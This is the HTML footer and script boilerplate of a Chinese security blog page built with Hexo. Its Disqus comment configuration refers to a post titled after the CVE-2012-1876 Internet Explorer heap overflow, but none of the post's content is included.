  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">giantbranch(simplelogin.irjqx@aleeas.com)</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




<div class="footer-custom">
<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
<br>
这是我的新博客，网站建于2017年10月
<!-- <br>以下UV,PV统计始于2018.06.23 -->
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  

  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  

    
      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
    

    
      <script type="text/javascript">
        var disqus_config = function () {
          this.page.url = 'https://www.giantbranch.cn/2017/08/19/CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞/';
          this.page.identifier = '2017/08/19/CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞/';
          this.page.title = 'CVE-2012-1876 IE MSHTML.DLL CalculateMinMax 堆溢出漏洞';
        };
        var d = document, s = d.createElement('script');
        s.src = 'https://giantbranch.disqus.com/embed.js';
        s.setAttribute('data-timestamp', '' + +new Date());
        (d.head || d.body).appendChild(s);
      </script>
    

  




	





  










  





  

  

  

  

  

  

</body>
</html>
